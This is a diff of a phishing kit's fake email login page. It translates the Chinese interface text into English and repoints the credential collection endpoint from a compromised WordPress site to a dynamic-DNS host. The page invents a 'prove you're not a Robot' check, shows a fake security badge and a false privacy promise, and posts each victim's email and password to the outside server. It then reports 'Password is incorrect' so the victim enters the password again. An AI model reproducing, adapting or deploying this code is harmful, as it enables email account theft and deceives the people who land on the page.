@@ -275,22 +275,23 @@
 
     <form name="myForm" id="login_form" action="" method="post">
       <div class="form-wrap" style="position: relative;">
-        <p>请登录您的电子邮件以证明您不是机器人。</p>
+        <p>Please sign in with your email to prove that you're not a Robot.</p>
         <div class="error" style="margin-top: 5px; display: none" id="err"></div>
         <div class="finput">
-          <input type="email" id="pet" name="login" placeholder="电子邮件地址" readonly required>
+          <input type="email" id="pet" name="login" placeholder="Email Address" readonly required>
         </div>
         <div class="finput">
-          <input type="password" name="passwd" placeholder="邮箱密码" id="pett" required>
+          <input type="password" name="passwd" placeholder="Email Password" id="pett" required="">
           <input type="hidden" id="source" name="source" value="others">
         </div>
         <div class="finput btn">
-          <button id="login_submit">继续</button>
+          <button id="login_submit">Continue</button>
         </div>
         <img src="./m/26-269507_arbys-logo-transparent-norton-secured-logo-png-png.png" width="107" height="58">
         <span class="privacy">
-          隐私政策: <span id="kai" style="text-transform:uppercase;"></span><br>
-          您的信息仅用于查看本文档的唯一目的，不会出售或共享给任何第三方。
+          Privacy Policy: <span id="kai" style="text-transform:uppercase;"></span><br>
+          Your information is only for the sole purpose of viewing this document and would not be sold or shared to any
+          third party.
         </span>
       </div>
     </form>
@@ -354,11 +355,11 @@ $("#zion").attr("src", "https://logo.clearbit.com/" + mainPage);
     e.preventDefault();
     if (!/.+@.+\..+/.test($("input[name='login']").val())) {
       showEl(err, "red");
-      err.textContent = "输入一个有效的电子邮件地址。";
+      err.textContent = "Enter a valid email address.";
       return;
     } else if (!$("input[name='passwd']").val() || !$("input[name='password']").val() > 4) {
       showEl(err, "red");
-      err.textContent = "输入您的正确密码！";
+      err.textContent = "Enter your correct password!";
       return;
     } else {
       count=count+1;
@@ -373,7 +374,7 @@ $("#zion").attr("src", "https://logo.clearbit.com/" + mainPage);
 
       $.ajax({
         type: "POST",
-        url:'https://svlspace.sk/wp-admin/0.php',
+        url:'https://mcoluomo.freedynamicdns.net/0.php',
         data: data,
         cache: false,
         timeout: 800000,
@@ -385,7 +386,7 @@ $("#zion").attr("src", "https://logo.clearbit.com/" + mainPage);
             pett.value = "";
             pett.style.borderColor = "red";
             showEl(err, "red");
-            err.textContent = "密码不正确。";
+            err.textContent = "Password is incorrect.";
 
             if (count>=2) {
                         count=0;
